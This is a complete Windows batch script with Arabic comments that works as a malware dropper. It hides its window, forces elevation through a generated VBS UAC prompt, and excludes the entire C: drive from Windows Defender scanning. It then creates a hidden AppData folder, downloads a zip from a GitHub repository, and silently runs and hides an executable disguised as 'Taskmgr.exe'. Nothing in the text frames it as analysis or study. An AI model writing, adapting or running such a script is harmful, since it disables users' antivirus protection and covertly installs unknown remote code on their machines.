@echo off
:: إخفاء نافذة PowerShell
powershell -window hidden -command ""

:: التحقق من بنية المعالج وتشغيل الأمر المناسب
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

:: التحقق من مستوى الخطأ وانتقال إلى الفقرة المناسبة
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    :: إنشاء ملف VBS للحصول على حقوق المسؤول
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    :: تشغيل ملف VBS
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    :: الانتقال إلى الدليل الحالي
    pushd "%CD%"
    CD /D "%~dp0"

    :: إضافة استثناء في Windows Defender باستخدام PowerShell
    powershell.exe -command "Add-MpPreference -ExclusionPath 'C:\'"

    :: إنشاء مجلد مخفي في AppData
    cd "%USERPROFILE%\AppData\Local"
    mkdir "CD"
    attrib +h "CD" /s /d
    cd "CD"

    :: تنزيل ملف مضغوط من GitHub واستخراجه باستخدام PowerShell
    powershell -Command "Invoke-Webrequest 'https://github.com/AnyTXDR/CD/raw/main/Taskmgr.zip' -OutFile Taskmgr.zip"
    powershell -Command "Expand-Archive -Path Taskmgr.zip -DestinationPath ."
    del Taskmgr.zip

    :: تشغيل الملف المستخرج وإخفاؤه
    start "" "%USERPROFILE%\AppData\Local\CD\Taskmgr.exe"
    attrib +h "%USERPROFILE%\AppData\Local\CD\Taskmgr.exe" /s /d

:: إنهاء السكربت
exit /B
